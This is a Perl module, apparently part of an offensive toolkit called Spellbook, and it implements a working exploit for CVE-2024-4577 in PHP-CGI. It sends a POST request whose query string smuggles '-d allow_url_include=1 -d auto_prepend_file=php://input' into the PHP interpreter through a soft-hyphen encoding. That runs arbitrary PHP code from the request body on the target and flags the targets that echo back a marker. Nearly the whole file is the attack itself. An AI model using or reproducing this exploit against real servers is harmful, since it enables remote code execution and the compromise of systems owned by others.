package Spellbook::Advisory::CVE_2024_4577 {
    use strict;
    use warnings;
    use Spellbook::Core::UserAgent;

    our $VERSION = '0.0.1';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $payload, @result);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'      => \$help,
            't|target=s'  => \$target,
            'p|payload=s' => \$payload
        );

        if ($target) {
            if ($target !~ /^https?:\/\//xsm) {
                $target = "http://$target";
            }

            my $code = $payload;

            if (!defined $code) {
                $code = q{};
            }

            my $useragent = Spellbook::Core::UserAgent -> new();
            my $request = $useragent -> post (
                "$target?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
                'Content' => "$code;echo 1337; die;"
            );

            if ($request -> is_success && $request -> decoded_content =~ /1337/xsm) {
                push @result, $target;
            }

            return @result;
        }

        if ($help) {
            return
                "\n"
              . "                \rAdvisory::CVE_2024_4577\n"
              . "                \r=======================\n"
              . "                \r-h, --help     See this menu\n"
              . "                \r-t, --target   Define a target\n"
              . "                \r-p, --payload  PHP code to execute\n\n\n";
        }

        return 0;
    }
}

1;
